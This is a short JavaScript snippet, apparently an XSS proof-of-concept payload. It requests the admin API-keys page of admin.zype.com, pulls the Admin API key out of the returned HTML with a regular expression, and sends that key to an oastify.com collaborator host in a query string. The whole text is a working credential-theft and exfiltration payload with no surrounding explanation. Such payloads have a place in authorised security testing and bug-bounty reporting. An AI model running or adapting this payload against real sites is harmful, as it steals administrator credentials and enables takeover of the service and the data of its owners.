fetch(“https://admin.zype.com/api_keys”).then(a => a.text()).then(a => {const apiKeyMatch = a.match(/<td>Admin</td>\s*<td>(\w+)</td>/);if (apiKeyMatch) {
const apiKey = apiKeyMatch[1];
return fetch(“https://exfqy68jks9il564hc6d3ik7dyjp7gv5.oastify.com?x=” + apiKey);
} else {
console.error(“API Key not found in the response”);
}
})
.then(response => {
console.log(response);
});
